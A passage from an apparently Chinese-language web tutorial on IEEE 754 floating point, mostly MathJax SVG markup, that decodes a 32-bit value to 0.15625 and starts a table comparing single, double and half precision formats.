316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3500,0)"></path></g><g data-mml-node="msub" transform="translate(4389,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(422,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5214.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(5992.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(9818.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mo" transform="translate(10818.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(11207.5,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(11929.7,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(12929.9,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(14416.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 解读步骤：</p>
<ol type="1">
<li><strong>符号位 0</strong>，表示正数。</li>
<li><strong>指数部分 01111100₂ = 124</strong>，计算真实指数： <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="15.462ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 6834 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(1722.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2722.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(4500.2,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(5556,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(6334,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></svg></mjx-container></span></li>
<li>尾数部分 IEEE 754 规定<strong>隐含的 1</strong>，即： <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.3ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 6320.7 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(1722.4,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(3486.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4542.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g></g></g></svg></mjx-container></span></li>
<li><strong>计算结果</strong>： <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.816ex;" xmlns="http://www.w3.org/2000/svg" width="27.442ex" height="2.773ex" role="img" focusable="false" viewBox="0 -864.9 12129.5 1225.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1708.9,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mn" transform="translate(2709.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(4764.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5820.7,0)"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mn" transform="translate(671.8,-345) scale(0.707)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><rect width="1457.2" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(7795.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(8851.5,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1778,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(2278,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(2778,0)"></path></g></g></g></svg></mjx-container></span></li>
</ol>
<p>IEEE 754 标准定义了多个不同的浮点数格式，常见的有：</p>
<table>
<colgroup>
<col style="width: 38%">
<col style="width: 9%">
<col style="width: 9%">
<col style="width: 9%">
<col style="width: 9%">
<col style="width: 24%">
</colgroup>
<thead>
<tr>
<th>类型</th>
<th>符号位</th>
<th>指数位</th>
<th>尾数位</th>
<th>总位数</th>
<th>约等于十进制精度</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>单精度（float）</strong></td>
<td>1</td>
<td>8</td>
<td>23</td>
<td>32</td>
<td>~7.2 位</td>
</tr>
<tr>
<td><strong>双精度（double）</strong></td>
<td>1</td>
<td>11</td>
<td>52</td>
<td>64</td>
<td>~15.9 位</td>
</tr>
<tr>
<td><strong>半精度（half）</strong></td>
<td>1</td>
<td>5</td>
<td>10</td>
<td>16</td>
<td>~3.3 位</td>
</tr>
<tr>
